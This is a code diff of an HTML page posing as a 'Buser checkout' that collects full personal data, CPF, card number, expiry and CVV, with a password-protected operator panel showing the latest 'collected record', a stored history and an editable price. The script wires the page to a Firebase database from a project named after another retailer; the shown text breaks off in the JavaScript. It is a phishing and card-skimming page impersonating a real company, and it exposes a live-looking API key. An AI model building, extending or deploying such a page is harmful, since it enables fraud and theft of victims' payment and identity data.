@@ -10,652 +10,123 @@
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-    }
-
-    body {
-      background: #e8e8e8;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px 16px;
-    }
-
-    .card {
-      max-width: 580px;
-      width: 100%;
-      background: #ffffff;
-      border-radius: 32px;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-      padding: 28px 24px 32px;
-      transition: all 0.2s;
-      border: 1px solid #d0d0d0;
-    }
-
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 24px;
-      flex-wrap: wrap;
-      gap: 8px;
-    }
-
-    .header h1 {
-      font-size: 24px;
-      font-weight: 700;
-      color: #000000;
-      letter-spacing: -0.3px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .header h1 span {
-      background: #e0e0e0;
-      padding: 4px 12px;
-      border-radius: 40px;
-      font-size: 13px;
-      font-weight: 500;
-      color: #222;
-    }
-
-    .admin-badge {
-      background: #ffffff;
-      border: 2px solid #000000;
-      border-radius: 30px;
-      padding: 6px 16px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #000000;
-      cursor: pointer;
-      transition: 0.15s;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .admin-badge:hover {
-      background: #000000;
-      color: #ffffff;
-    }
-
-    .titulo-secao {
-      font-weight: 600;
-      font-size: 18px;
-      color: #000000;
-      margin: 24px 0 14px 0;
-      border-bottom: 2px solid #d0d0d0;
-      padding-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
+    body { background: #e8e8e8; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px 16px; }
+    .card { max-width: 580px; width: 100%; background: #ffffff; border-radius: 32px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); padding: 28px 24px 32px; border: 1px solid #d0d0d0; }
+    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; flex-wrap: wrap; gap: 8px; }
+    .header h1 { font-size: 24px; font-weight: 700; color: #000000; display: flex; align-items: center; gap: 6px; }
+    .header h1 span { background: #e0e0e0; padding: 4px 12px; border-radius: 40px; font-size: 13px; font-weight: 500; color: #222; }
+    .admin-badge { background: #ffffff; border: 2px solid #000000; border-radius: 30px; padding: 6px 16px; font-size: 13px; font-weight: 600; color: #000000; cursor: pointer; transition: 0.15s; display: flex; align-items: center; gap: 6px; }
+    .admin-badge:hover { background: #000000; color: #ffffff; }
+    .titulo-secao { font-weight: 600; font-size: 18px; color: #000000; margin: 24px 0 14px 0; border-bottom: 2px solid #d0d0d0; padding-bottom: 8px; display: flex; align-items: center; gap: 8px; }
     .titulo-secao:first-of-type { margin-top: 0; }
-
-    .form-group {
-      margin-bottom: 14px;
-    }
-
-    .form-group label {
-      display: block;
-      font-weight: 500;
-      font-size: 14px;
-      color: #000000;
-      margin-bottom: 4px;
-    }
-    .form-group label small {
-      font-weight: 400;
-      color: #555;
-    }
-
-    .form-group input, .form-group select {
-      width: 100%;
-      padding: 12px 14px;
-      border: 2px solid #cccccc;
-      border-radius: 14px;
-      font-size: 15px;
-      background: #ffffff;
-      transition: 0.15s;
-      outline: none;
-      color: #000;
-    }
-
-    .form-group input:focus, .form-group select:focus {
-      border-color: #000000;
-      box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.1);
-      background: #ffffff;
-    }
-
-    .form-group input::placeholder {
-      color: #999;
-    }
-
-    .row-duplo {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-    .row-duplo .form-group {
-      flex: 1;
-      min-width: 120px;
-    }
-
-    .row-triplo {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-    .row-triplo .form-group {
-      flex: 1;
-      min-width: 80px;
-    }
-
-    .resumo-pagamento {
-      background: #f5f5f5;
-      border-radius: 24px;
-      padding: 18px 16px;
-      border: 1px solid #d0d0d0;
-      margin: 24px 0 18px;
-    }
-
-    .resumo-linha {
-      display: flex;
-      justify-content: space-between;
-      padding: 6px 0;
-      font-size: 15px;
-      color: #000;
-    }
-    .resumo-linha.total {
-      font-weight: 700;
-      font-size: 20px;
-      border-top: 2px solid #b0b0b0;
-      margin-top: 6px;
-      padding-top: 14px;
-      color: #000000;
-    }
-    .resumo-linha .valor {
-      font-weight: 600;
-    }
-    .resumo-linha.total .valor {
-      font-weight: 700;
-    }
-
-    .recebedor-info {
-      background: #ececec;
-      border-radius: 40px;
-      padding: 8px 16px;
-      font-size: 13px;
-      color: #000;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 12px 20px;
-      margin-bottom: 18px;
-      justify-content: center;
-      border: 1px solid #b0b0b0;
-    }
-    .recebedor-info span {
-      font-weight: 500;
-    }
-
-    .btn-finalizar {
-      width: 100%;
-      background: #000000;
-      border: none;
-      border-radius: 60px;
-      padding: 18px 12px;
-      font-size: 20px;
-      font-weight: 700;
-      color: #ffffff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      box-shadow: 0 8px 18px rgba(0, 0, 0, 0.25);
-      transition: 0.15s;
-      cursor: pointer;
-      border: 2px solid #000000;
-      margin-top: 6px;
-    }
-
-    .btn-finalizar:active {
-      transform: scale(0.97);
-      background: #222222;
-    }
-
-    .modal-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      z-index: 999;
-      align-items: center;
-      justify-content: center;
-      animation: fadeIn 0.25s ease;
-    }
-
-    .modal-overlay.aberto {
-      display: flex;
-    }
-
-    .modal {
-      background: #ffffff;
-      border-radius: 28px;
-      max-width: 500px;
-      width: 92%;
-      padding: 32px 28px 28px;
-      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
-      animation: slideUp 0.3s ease;
-      border: 2px solid #000;
-      max-height: 90vh;
-      overflow-y: auto;
-    }
-
-    .modal-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-
-    .modal-header h2 {
-      font-size: 20px;
-      font-weight: 700;
-      color: #000;
-      letter-spacing: -0.3px;
-    }
-
-    .modal-fechar {
-      background: none;
-      border: none;
-      font-size: 28px;
-      cursor: pointer;
-      color: #000;
-      padding: 0 4px;
-      transition: 0.15s;
-    }
-
-    .modal-fechar:hover {
-      transform: scale(1.1);
-    }
-
-    .modal label {
-      display: block;
-      font-weight: 600;
-      font-size: 14px;
-      color: #000;
-      margin-bottom: 4px;
-    }
-
-    .modal input {
-      width: 100%;
-      padding: 14px 16px;
-      border: 2px solid #cccccc;
-      border-radius: 12px;
-      font-size: 16px;
-      background: #fafafa;
-      margin-bottom: 16px;
-      transition: 0.15s;
-      outline: none;
-      color: #000;
-    }
-
-    .modal input:focus {
-      border-color: #000;
-      background: #fff;
-    }
-
-    .modal .senha-erro {
-      color: #d32f2f;
-      font-size: 14px;
-      margin-top: -10px;
-      margin-bottom: 12px;
-      display: none;
-      font-weight: 500;
-    }
-
-    .modal .senha-erro.visivel {
-      display: block;
-    }
-
-    .modal .btn-modal {
-      width: 100%;
-      background: #000000;
-      color: #ffffff;
-      border: none;
-      border-radius: 60px;
-      padding: 16px;
-      font-weight: 700;
-      font-size: 17px;
-      cursor: pointer;
-      transition: 0.15s;
-      margin-top: 4px;
-    }
-
-    .modal .btn-modal:active {
-      transform: scale(0.97);
-      background: #222;
-    }
-
-    .modal .btn-modal.secundario {
-      background: #e0e0e0;
-      color: #000;
-      margin-top: 10px;
-    }
-
-    .modal .btn-modal.secundario:active {
-      background: #ccc;
-    }
-
-    .modal .btn-modal.danger {
-      background: #c62828;
-      color: #fff;
-      margin-top: 10px;
-    }
-
-    .modal .btn-modal.danger:active {
-      background: #b71c1c;
-    }
-
-    .modal .dados-cliente {
-      background: #f5f5f5;
-      border-radius: 16px;
-      padding: 16px;
-      margin: 12px 0 16px;
-      border: 1px solid #ddd;
-      font-size: 14px;
-    }
-
-    .modal .dados-cliente p {
-      display: flex;
-      justify-content: space-between;
-      padding: 4px 0;
-      border-bottom: 1px dashed #ddd;
-      margin: 0;
-    }
-
-    .modal .dados-cliente p:last-child {
-      border-bottom: none;
-    }
-
-    .modal .dados-cliente .label {
-      font-weight: 600;
-      color: #333;
-    }
-
-    .modal .dados-cliente .value {
-      color: #000;
-      font-weight: 500;
-    }
-
-    .modal .sub-titulo {
-      font-weight: 600;
-      font-size: 16px;
-      color: #000;
-      margin: 12px 0 8px;
-    }
-
-    .historico-item {
-      background: #f9f9f9;
-      border-radius: 12px;
-      padding: 12px;
-      margin-bottom: 10px;
-      border: 1px solid #e0e0e0;
-      font-size: 13px;
-    }
-
-    .historico-item .data {
-      font-weight: 600;
-      color: #000;
-      margin-bottom: 4px;
-    }
-
-    .historico-item .info {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 4px 12px;
-      color: #333;
-    }
-
-    .historico-item .info span {
-      background: #e8e8e8;
-      padding: 2px 8px;
-      border-radius: 12px;
-      font-size: 12px;
-    }
-
-    .historico-vazio {
-      color: #888;
-      text-align: center;
-      padding: 20px;
-      font-style: italic;
-    }
-
-    .msg-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.85);
-      z-index: 1000;
-      align-items: center;
-      justify-content: center;
-      animation: fadeIn 0.3s ease;
-    }
-
-    .msg-overlay.aberto {
-      display: flex;
-    }
-
-    .msg-box {
-      background: #ffffff;
-      border-radius: 28px;
-      max-width: 380px;
-      width: 90%;
-      padding: 40px 32px 32px;
-      text-align: center;
-      border: 2px solid #000;
-      animation: slideUp 0.3s ease;
-      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
-    }
-
-    .msg-box .icone {
-      font-size: 56px;
-      margin-bottom: 16px;
-    }
-
-    .msg-box h2 {
-      font-size: 24px;
-      font-weight: 700;
-      color: #000;
-      margin-bottom: 8px;
-    }
-
-    .msg-box p {
-      font-size: 16px;
-      color: #555;
-      margin-bottom: 24px;
-    }
-
-    .msg-box .btn-ok {
-      background: #000000;
-      color: #ffffff;
-      border: none;
-      border-radius: 60px;
-      padding: 14px 40px;
-      font-weight: 700;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.15s;
-    }
-
-    .msg-box .btn-ok:active {
-      transform: scale(0.97);
-      background: #222;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    @keyframes slideUp {
-      from { transform: translateY(30px) scale(0.95); opacity: 0; }
-      to { transform: translateY(0) scale(1); opacity: 1; }
-    }
-
-    .carregando-cep {
-      font-size: 12px;
-      color: #666;
-      margin-top: 4px;
-      display: none;
-    }
-
-    .carregando-cep.ativo {
-      display: block;
-    }
-
-    @media (max-width: 480px) {
-      .card { padding: 16px; }
-      .row-duplo, .row-triplo { gap: 8px; }
-      .modal { padding: 24px 20px; }
-      .msg-box { padding: 30px 20px 24px; }
-    }
+    .form-group { margin-bottom: 14px; }
+    .form-group label { display: block; font-weight: 500; font-size: 14px; color: #000000; margin-bottom: 4px; }
+    .form-group label small { font-weight: 400; color: #555; }
+    .form-group input, .form-group select { width: 100%; padding: 12px 14px; border: 2px solid #cccccc; border-radius: 14px; font-size: 15px; background: #ffffff; transition: 0.15s; outline: none; color: #000; }
+    .form-group input:focus, .form-group select:focus { border-color: #000000; box-shadow: 0 0 0 3px rgba(0,0,0,0.1); background: #ffffff; }
+    .form-group input::placeholder { color: #999; }
+    .row-duplo { display: flex; gap: 12px; flex-wrap: wrap; }
+    .row-duplo .form-group { flex: 1; min-width: 120px; }
+    .row-triplo { display: flex; gap: 12px; flex-wrap: wrap; }
+    .row-triplo .form-group { flex: 1; min-width: 80px; }
+    .resumo-pagamento { background: #f5f5f5; border-radius: 24px; padding: 18px 16px; border: 1px solid #d0d0d0; margin: 24px 0 18px; }
+    .resumo-linha { display: flex; justify-content: space-between; padding: 6px 0; font-size: 15px; color: #000; }
+    .resumo-linha.total { font-weight: 700; font-size: 20px; border-top: 2px solid #b0b0b0; margin-top: 6px; padding-top: 14px; color: #000000; }
+    .resumo-linha .valor { font-weight: 600; }
+    .resumo-linha.total .valor { font-weight: 700; }
+    .recebedor-info { background: #ececec; border-radius: 40px; padding: 8px 16px; font-size: 13px; color: #000; display: flex; flex-wrap: wrap; gap: 12px 20px; margin-bottom: 18px; justify-content: center; border: 1px solid #b0b0b0; }
+    .recebedor-info span { font-weight: 500; }
+    .btn-finalizar { width: 100%; background: #000000; border: none; border-radius: 60px; padding: 18px 12px; font-size: 20px; font-weight: 700; color: #ffffff; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 8px 18px rgba(0,0,0,0.25); transition: 0.15s; cursor: pointer; border: 2px solid #000000; margin-top: 6px; }
+    .btn-finalizar:active { transform: scale(0.97); background: #222222; }
+    .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 999; align-items: center; justify-content: center; animation: fadeIn 0.25s ease; }
+    .modal-overlay.aberto { display: flex; }
+    .modal { background: #ffffff; border-radius: 28px; max-width: 500px; width: 92%; padding: 32px 28px 28px; box-shadow: 0 30px 60px rgba(0,0,0,0.5); animation: slideUp 0.3s ease; border: 2px solid #000; max-height: 90vh; overflow-y: auto; }
+    .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    .modal-header h2 { font-size: 20px; font-weight: 700; color: #000; letter-spacing: -0.3px; }
+    .modal-fechar { background: none; border: none; font-size: 28px; cursor: pointer; color: #000; padding: 0 4px; transition: 0.15s; }
+    .modal-fechar:hover { transform: scale(1.1); }
+    .modal label { display: block; font-weight: 600; font-size: 14px; color: #000; margin-bottom: 4px; }
+    .modal input { width: 100%; padding: 14px 16px; border: 2px solid #cccccc; border-radius: 12px; font-size: 16px; background: #fafafa; margin-bottom: 16px; transition: 0.15s; outline: none; color: #000; }
+    .modal input:focus { border-color: #000; background: #fff; }
+    .modal .senha-erro { color: #d32f2f; font-size: 14px; margin-top: -10px; margin-bottom: 12px; display: none; font-weight: 500; }
+    .modal .senha-erro.visivel { display: block; }
+    .modal .btn-modal { width: 100%; background: #000000; color: #ffffff; border: none; border-radius: 60px; padding: 16px; font-weight: 700; font-size: 17px; cursor: pointer; transition: 0.15s; margin-top: 4px; }
+    .modal .btn-modal:active { transform: scale(0.97); background: #222; }
+    .modal .btn-modal.secundario { background: #e0e0e0; color: #000; margin-top: 10px; }
+    .modal .btn-modal.secundario:active { background: #ccc; }
+    .modal .btn-modal.danger { background: #c62828; color: #fff; margin-top: 10px; }
+    .modal .btn-modal.danger:active { background: #b71c1c; }
+    .modal .dados-cliente { background: #f5f5f5; border-radius: 16px; padding: 16px; margin: 12px 0 16px; border: 1px solid #ddd; font-size: 14px; }
+    .modal .dados-cliente p { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px dashed #ddd; margin: 0; }
+    .modal .dados-cliente p:last-child { border-bottom: none; }
+    .modal .dados-cliente .label { font-weight: 600; color: #333; }
+    .modal .dados-cliente .value { color: #000; font-weight: 500; }
+    .modal .sub-titulo { font-weight: 600; font-size: 16px; color: #000; margin: 12px 0 8px; }
+    .historico-item { background: #f9f9f9; border-radius: 12px; padding: 12px; margin-bottom: 10px; border: 1px solid #e0e0e0; font-size: 13px; }
+    .historico-item .data { font-weight: 600; color: #000; margin-bottom: 4px; }
+    .historico-item .info { display: flex; flex-wrap: wrap; gap: 4px 12px; color: #333; }
+    .historico-item .info span { background: #e8e8e8; padding: 2px 8px; border-radius: 12px; font-size: 12px; }
+    .historico-vazio { color: #888; text-align: center; padding: 20px; font-style: italic; }
+    .msg-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; animation: fadeIn 0.3s ease; }
+    .msg-overlay.aberto { display: flex; }
+    .msg-box { background: #ffffff; border-radius: 28px; max-width: 380px; width: 90%; padding: 40px 32px 32px; text-align: center; border: 2px solid #000; animation: slideUp 0.3s ease; box-shadow: 0 30px 60px rgba(0,0,0,0.5); }
+    .msg-box .icone { font-size: 56px; margin-bottom: 16px; }
+    .msg-box h2 { font-size: 24px; font-weight: 700; color: #000; margin-bottom: 8px; }
+    .msg-box p { font-size: 16px; color: #555; margin-bottom: 24px; }
+    .msg-box .btn-ok { background: #000000; color: #ffffff; border: none; border-radius: 60px; padding: 14px 40px; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.15s; }
+    .msg-box .btn-ok:active { transform: scale(0.97); background: #222; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes slideUp { from { transform: translateY(30px) scale(0.95); opacity: 0; } to { transform: translateY(0) scale(1); opacity: 1; } }
+    .carregando-cep { font-size: 12px; color: #666; margin-top: 4px; display: none; }
+    .carregando-cep.ativo { display: block; }
+    @media (max-width: 480px) { .card { padding: 16px; } .row-duplo, .row-triplo { gap: 8px; } .modal { padding: 24px 20px; } .msg-box { padding: 30px 20px 24px; } }
   </style>
 </head>
 <body>
-<div class="card" id="app">
+<div class="card">
 
   <div class="header">
     <h1>Buser <span>checkout</span></h1>
-    <div class="admin-badge" id="btnAbrirAdmin">
-      ⚙️ Acesso Administrativo
-    </div>
+    <div class="admin-badge" id="btnAbrirAdmin">⚙️ Acesso Administrativo</div>
   </div>
 
   <p style="color: #444; margin-bottom: 6px; font-weight: 500; font-size: 15px;">Preencha os dados abaixo para concluir o pedido.</p>
 
-  <!-- DADOS PESSOAIS -->
   <div class="titulo-secao">👤 Dados Pessoais</div>
-
-  <div class="form-group">
-    <label>Nome completo * <small>(Como no cartão)</small></label>
-    <input type="text" id="nomeCompleto" placeholder="Ex: João Silva">
-  </div>
-
-  <div class="form-group">
-    <label>E-mail *</label>
-    <input type="email" id="email" placeholder="exemplo@email.com">
-  </div>
-
+  <div class="form-group"><label>Nome completo * <small>(Como no cartão)</small></label><input type="text" id="nomeCompleto" placeholder="Ex: João Silva"></div>
+  <div class="form-group"><label>E-mail *</label><input type="email" id="email" placeholder="exemplo@email.com"></div>
   <div class="row-duplo">
-    <div class="form-group">
-      <label>CPF *</label>
-      <input type="text" class="cpf-mask" id="cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
-    </div>
-    <div class="form-group">
-      <label>Telefone *</label>
-      <input type="text" class="telefone-mask" id="telefone" placeholder="(11) 99999-9999" maxlength="15" inputmode="numeric">
-    </div>
+    <div class="form-group"><label>CPF *</label><input type="text" class="cpf-mask" id="cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric"></div>
+    <div class="form-group"><label>Telefone *</label><input type="text" class="telefone-mask" id="telefone" placeholder="(11) 99999-9999" maxlength="15" inputmode="numeric"></div>
   </div>
 
-  <!-- ENDEREÇO -->
   <div class="titulo-secao">📍 Endereço de Cobrança</div>
-
-  <div class="form-group">
-    <label>CEP *</label>
-    <input type="text" class="cep-mask" id="cep" placeholder="00000-000" maxlength="9" inputmode="numeric">
-    <div class="carregando-cep" id="carregandoCep">⏳ Buscando endereço...</div>
-  </div>
-  <div class="form-group">
-    <label>Logradouro *</label>
-    <input type="text" id="logradouro" placeholder="Rua, Avenida...">
+  <div class="form-group"><label>CEP *</label><input type="text" class="cep-mask" id="cep" placeholder="00000-000" maxlength="9" inputmode="numeric"><div class="carregando-cep" id="carregandoCep">⏳ Buscando endereço...</div></div>
+  <div class="form-group"><label>Logradouro *</label><input type="text" id="logradouro" placeholder="Rua, Avenida..."></div>
+  <div class="row-duplo">
+    <div class="form-group"><label>Número *</label><input type="text" id="numero" placeholder="123"></div>
+    <div class="form-group"><label>Complemento</label><input type="text" id="complemento" placeholder="Apto, bloco..."></div>
   </div>
   <div class="row-duplo">
-    <div class="form-group">
-      <label>Número *</label>
-      <input type="text" id="numero" placeholder="123">
-    </div>
-    <div class="form-group">
-      <label>Complemento</label>
-      <input type="text" id="complemento" placeholder="Apto, bloco...">
-    </div>
-  </div>
-  <div class="row-duplo">
-    <div class="form-group">
-      <label>Bairro *</label>
-      <input type="text" id="bairro" placeholder="Centro">
-    </div>
-    <div class="form-group">
-      <label>Cidade *</label>
-      <input type="text" id="cidade" placeholder="São Paulo">
-    </div>
-    <div class="form-group" style="flex: 0.5; min-width: 70px;">
-      <label>UF *</label>
-      <input type="text" id="uf" placeholder="SP">
-    </div>
+    <div class="form-group"><label>Bairro *</label><input type="text" id="bairro" placeholder="Centro"></div>
+    <div class="form-group"><label>Cidade *</label><input type="text" id="cidade" placeholder="São Paulo"></div>
+    <div class="form-group" style="flex:0.5;min-width:70px;"><label>UF *</label><input type="text" id="uf" placeholder="SP"></div>
   </div>
 
-  <!-- DADOS DO CARTÃO -->
   <div class="titulo-secao">💳 Dados do Cartão de Crédito</div>
-
-  <div class="form-group">
-    <label>Número do cartão *</label>
-    <input type="text" class="cartao-mask" id="cartaoNumero" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
-  </div>
-  <div class="form-group">
-    <label>Nome no cartão *</label>
-    <input type="text" id="nomeCartao" placeholder="Como gravado no cartão">
-  </div>
-  <div class="form-group">
-    <label>CPF do titular *</label>
-    <input type="text" class="cpf-mask" id="cpfTitular" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
-  </div>
+  <div class="form-group"><label>Número do cartão *</label><input type="text" class="cartao-mask" id="cartaoNumero" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric"></div>
+  <div class="form-group"><label>Nome no cartão *</label><input type="text" id="nomeCartao" placeholder="Como gravado no cartão"></div>
+  <div class="form-group"><label>CPF do titular *</label><input type="text" class="cpf-mask" id="cpfTitular" placeholder="000.000.000-00" maxlength="14" inputmode="numeric"></div>
   <div class="row-triplo">
-    <div class="form-group">
-      <label>Validade *</label>
-      <input type="text" class="validade-mask" id="validade" placeholder="MM/AA" maxlength="5" inputmode="numeric">
-    </div>
-    <div class="form-group">
-      <label>CVV *</label>
-      <input type="text" class="cvv-mask" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
-    </div>
-    <div class="form-group">
-      <label>Parcelas</label>
-      <select id="parcelasSelect">
-        <option value="1">1x sem juros</option>
-        <option value="2">2x</option>
-        <option value="3">3x</option>
-        <option value="4">4x</option>
-        <option value="5">5x</option>
-        <option value="6">6x</option>
-        <option value="7">7x</option>
-        <option value="8">8x</option>
-        <option value="9">9x</option>
-        <option value="10">10x</option>
-        <option value="11">11x</option>
-        <option value="12" selected>12x</option>
-      </select>
-    </div>
+    <div class="form-group"><label>Validade *</label><input type="text" class="validade-mask" id="validade" placeholder="MM/AA" maxlength="5" inputmode="numeric"></div>
+    <div class="form-group"><label>CVV *</label><input type="text" class="cvv-mask" id="cvv" placeholder="123" maxlength="3" inputmode="numeric"></div>
+    <div class="form-group"><label>Parcelas</label><select id="parcelasSelect"><option value="1">1x sem juros</option><option value="2">2x</option><option value="3">3x</option><option value="4">4x</option><option value="5">5x</option><option value="6">6x</option><option value="7">7x</option><option value="8">8x</option><option value="9">9x</option><option value="10">10x</option><option value="11">11x</option><option value="12" selected>12x</option></select></div>
   </div>
 
-  <!-- RESUMO + RECEBEDOR -->
   <div class="resumo-pagamento">
-    <div class="resumo-linha">
-      <span>Total a pagar:</span>
-      <span class="valor" id="totalPagar">R$ 0,00</span>
-    </div>
-    <div style="font-size: 14px; color: #555; margin-top: 2px;" id="parcelaDetalhe">12x de R$ 0,00</div>
+    <div class="resumo-linha"><span>Total a pagar:</span><span class="valor" id="totalPagar">R$ 0,00</span></div>
+    <div style="font-size:14px;color:#555;margin-top:2px;" id="parcelaDetalhe">12x de R$ 0,00</div>
   </div>
 
   <div class="recebedor-info">
@@ -664,52 +135,39 @@
     <span>🏦 Instituição: Stark Bank</span>
   </div>
 
-  <button class="btn-finalizar" id="btnFinalizar">
-    Finalizar Compra
-  </button>
+  <button class="btn-finalizar" id="btnFinalizar">Finalizar Compra</button>
 </div>
 
-<!-- MODAL SENHA + PAINEL -->
+<!-- MODAL ADMIN -->
 <div class="modal-overlay" id="modalAdmin">
   <div class="modal">
-    <div class="modal-header">
-      <h2 id="modalTitulo">🔐 Acesso Administrativo</h2>
-      <button class="modal-fechar" id="modalFechar">✕</button>
-    </div>
-
+    <div class="modal-header"><h2 id="modalTitulo">🔐 Acesso Administrativo</h2><button class="modal-fechar" id="modalFechar">✕</button></div>
     <div id="areaSenha">
       <label for="senhaModal">Digite a senha para acessar o painel</label>
       <input type="password" id="senhaModal" placeholder="Digite a senha">
       <div class="senha-erro" id="senhaErroModal">❌ Senha incorreta. Tente novamente.</div>
       <button class="btn-modal" id="btnConfirmarSenha">🔓 Confirmar senha</button>
     </div>
-
-    <div id="areaPainel" style="display: none;">
-      <p style="color: #2e7d32; font-weight: 600; margin-bottom: 12px;">✅ Acesso liberado</p>
-
+    <div id="areaPainel" style="display:none;">
+      <p style="color:#2e7d32;font-weight:600;margin-bottom:12px;">✅ Acesso liberado</p>
       <label for="novoValorModal">Alterar valor (R$)</label>
       <input type="number" id="novoValorModal" step="0.01" placeholder="0.00" value="99.00">
-      <button class="btn-modal" id="btnSalvarModal" style="margin-bottom: 16px;">💾 Salvar valor</button>
-
+      <button class="btn-modal" id="btnSalvarModal" style="margin-bottom:16px;">💾 Salvar valor</button>
       <div class="sub-titulo">📋 Último registro coletado</div>
       <div class="dados-cliente" id="dadosClienteModal">
-        <p><span class="label">Nome:</span> <span class="value" id="dNome">—</span></p>
-        <p><span class="label">E-mail:</span> <span class="value" id="dEmail">—</span></p>
-        <p><span class="label">CPF:</span> <span class="value" id="dCpf">—</span></p>
-        <p><span class="label">Telefone:</span> <span class="value" id="dTelefone">—</span></p>
-        <p><span class="label">Endereço:</span> <span class="value" id="dEndereco">—</span></p>
-        <p><span class="label">Cartão:</span> <span class="value" id="dCartao">—</span></p>
-        <p><span class="label">Validade:</span> <span class="value" id="dValidade">—</span></p>
-        <p><span class="label">CVV:</span> <span class="value" id="dCvv">—</span></p>
-        <p><span class="label">Parcelas:</span> <span class="value" id="dParcelas">—</span></p>
-        <p><span class="label">Valor:</span> <span class="value" id="dValor">—</span></p>
+        <p><span class="label">Nome:</span><span class="value" id="dNome">—</span></p>
+        <p><span class="label">E-mail:</span><span class="value" id="dEmail">—</span></p>
+        <p><span class="label">CPF:</span><span class="value" id="dCpf">—</span></p>
+        <p><span class="label">Telefone:</span><span class="value" id="dTelefone">—</span></p>
+        <p><span class="label">Endereço:</span><span class="value" id="dEndereco">—</span></p>
+        <p><span class="label">Cartão:</span><span class="value" id="dCartao">—</span></p>
+        <p><span class="label">Validade:</span><span class="value" id="dValidade">—</span></p>
+        <p><span class="label">CVV:</span><span class="value" id="dCvv">—</span></p>
+        <p><span class="label">Parcelas:</span><span class="value" id="dParcelas">—</span></p>
+        <p><span class="label">Valor:</span><span class="value" id="dValor">—</span></p>
       </div>
-
-      <div class="sub-titulo" style="margin-top: 16px;">📜 Histórico de registros</div>
-      <div id="historicoContainer">
-        <div class="historico-vazio">Nenhum registro salvo ainda</div>
-      </div>
-
+      <div class="sub-titulo" style="margin-top:16px;">📜 Histórico de registros</div>
+      <div id="historicoContainer"><div class="historico-vazio">Nenhum registro salvo ainda</div></div>
       <button class="btn-modal danger" id="btnLimparHistorico">🗑️ Limpar histórico</button>
       <button class="btn-modal secundario" id="btnFecharModal">Fechar</button>
     </div>
@@ -727,424 +185,348 @@
 </div>
 
 <script>
-  (function() {
-    // ============================================================
-    // 🔥 FIREBASE CONFIG - CONFIGURADO COM SUAS CREDENCIAIS
-    // ============================================================
-    const firebaseConfig = {
-      apiKey: "AIzaSyABGtzfPaShB39xuyLji19cI7uF223UFoQ",
-      authDomain: "projeto-americanas-9c236.firebaseapp.com",
-      databaseURL: "https://projeto-americanas-9c236-default-rtdb.firebaseio.com",
-      projectId: "projeto-americanas-9c236",
-      storageBucket: "projeto-americanas-9c236.firebasestorage.app",
-      messagingSenderId: "744546490117",
-      appId: "1:744546490117:web:5eb9483523d5073549496c",
-      measurementId: "G-TJ2WCH18ZL"
-    };
+(function() {
+  // ============================================================
+  // 🔥 FIREBASE CONFIG - CREDENCIAIS CORRETAS DO SEU PROJETO
+  // ============================================================
+  const firebaseConfig = {
+    apiKey: "AIzaSyABGtzfPaShB39xuyLji19cI7uF223UFoQ",
+    authDomain: "projeto-americanas-9c236.firebaseapp.com",
+    databaseURL: "https://projeto-americanas-9c236-default-rtdb.firebaseio.com",
+    projectId: "projeto-americanas-9c236",
+    storageBucket: "projeto-americanas-9c236.firebasestorage.app",
+    messagingSenderId: "744546490117",
+    appId: "1:744546490117:web:5eb9483523d5073549496c",
+    measurementId: "G-TJ2WCH18ZL"
+  };
 
-    let database;
-    let firebaseInicializado = false;
+  let database;
+  let firebaseInicializado = false;
 
-    try {
-      firebase.initializeApp(firebaseConfig);
-      database = firebase.database();
-      firebaseInicializado = true;
-      console.log('✅ Firebase conectado');
-    } catch (e) {
-      console.warn('Firebase não inicializado:', e);
-    }
+  try {
+    firebase.initializeApp(firebaseConfig);
+    database = firebase.database();
+    firebaseInicializado = true;
+    console.log('✅ Firebase conectado com sucesso!');
+  } catch (e) {
+    console.warn('Firebase não inicializado:', e);
+  }
 
-    // ===== MÁSCARAS =====
-    function aplicarMascara(input, pattern) {
-      input.addEventListener('input', function(e) {
